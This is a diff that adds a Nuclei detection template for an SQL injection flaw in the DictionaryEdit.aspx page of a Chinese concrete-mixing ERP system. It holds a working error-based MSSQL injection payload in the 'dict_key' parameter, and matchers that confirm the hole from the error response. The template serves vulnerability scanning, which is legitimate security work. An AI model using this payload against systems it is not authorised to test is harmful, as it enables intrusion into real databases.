@@ -1,0 +1,30 @@
+id: shanghun-erp-dictionaryedit-sqli
+info:
+  name: 商混ERP系统 DictionaryEdit.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    商混ERP系统 DictionaryEdit.aspx 存在SQL注入漏洞，通过精心构造的payload，可以确认漏洞的存在。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(255),sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27)))-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+          - "varchar"
+          - "System.Data.SqlClient.SqlException"
